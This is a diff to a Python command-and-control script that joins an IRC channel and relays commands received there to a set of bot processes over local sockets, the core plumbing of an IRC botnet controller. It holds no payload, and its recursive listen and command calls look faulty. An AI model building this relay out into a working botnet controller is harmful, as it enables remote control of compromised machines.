@@ -12,6 +12,7 @@ server = MASTERSERVER[0]
 channel = MASTERCHANNEL
 masternick = MASTERNICK
 bots = []
+bot_socks = []
 
 
 class CC():
@@ -30,6 +31,8 @@ class CC():
             self.join_server()
             self.create_channel()
             self.create_bots()
+            time.sleep(15)
+            self.connect_bot_sockets()
             self.listen()
 
     def print_envs(self):
@@ -47,22 +50,11 @@ class CC():
 
     def create_channel(self):
         self.sock.send(bytes("JOIN "+ channel +"\n", "UTF-8"))
-        time.sleep(3)
-
-    # def create_sockets(self):
-    #     for server in BOTSERVERS:
-    #         for_read = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #         for_write = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #         for_read.connect((server, 6667))
-    #         for_write.connect((server, 6667))
-    #
-
 
     def create_bots(self):
         for i, server in enumerate(BOTSERVERS):
             bot = Bot(server, self.sock)
             bots.append(bot)
-
 
     def listen(self):
         while 1:
@@ -80,14 +72,26 @@ class CC():
                     if line[0] == "PING":
                         self.sock.send(bytes("PONG " + line[1] + "\r\n", "UTF-8"))
 
+                    if line[0] == "RESP:":
+                        print("")
+
+                    if line[0] == "CMD:":
+                        print("")
+
                     if len(line) >= 4:
                         if line[1] == "PRIVMSG":
                             command = line[3][1:] + " " + line[4]
                             for bot in bots:
-                                bot.command(command)
+                                self.command(command)
 
+    def connect_bot_sockets(self):
+        for bot in bots:
+            bot_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            bot_sock.connect(("127.0.0.1", bot.local_port))
+            bot_socks.append(bot_sock)
 
-    # def command(self, cmd):
-    #     for bot in bots:
-    #         bot.cmd_status = cmd
-    #     self.listen()
+    def command(self, cmd):
+        for bot_sock in bot_socks:
+            print(cmd)
+            bot_sock.send(bytes("CMD: " + cmd + "\n", "UTF-8"))
+        self.listen()
